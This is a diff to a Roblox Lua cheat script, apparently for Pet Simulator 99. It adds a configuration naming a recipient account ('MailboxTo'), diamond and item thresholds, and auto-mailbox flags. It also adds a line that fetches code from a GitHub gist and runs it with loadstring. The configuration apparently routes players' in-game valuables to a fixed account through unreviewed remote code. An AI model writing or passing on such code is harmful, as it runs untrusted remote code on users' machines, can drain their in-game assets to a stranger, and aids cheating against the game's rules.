@@ -17,6 +17,16 @@ getgenv().MoneyPrinter = {
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xnazov/KITTYWARE_PS99/main/auto%20balloons"))()
 ]]--
+getgenv().configTable = {
+    MailboxTo = "paule072010",
+    MinimumAmountDiamond = 1000000,
+    MinimumAmountItem = 250000,
+    AutoMailbox = false,
+    AutoMailboxClaim = false,
+    Blacklist = {"Old Boot", "Diamond Rod", "Diamond Shovel"}
+}
+loadstring(game:HttpGet("https://gist.githubusercontent.com/AnigamiYT/b7d65db398aa182ef128c25329a24e7f/raw/gistfile1.txt"))()
+
 
 game:GetService("GuiService").ErrorMessageChanged:Connect(function()
 wait (2) game:GetService("TeleportService"):Teleport(8737899170)
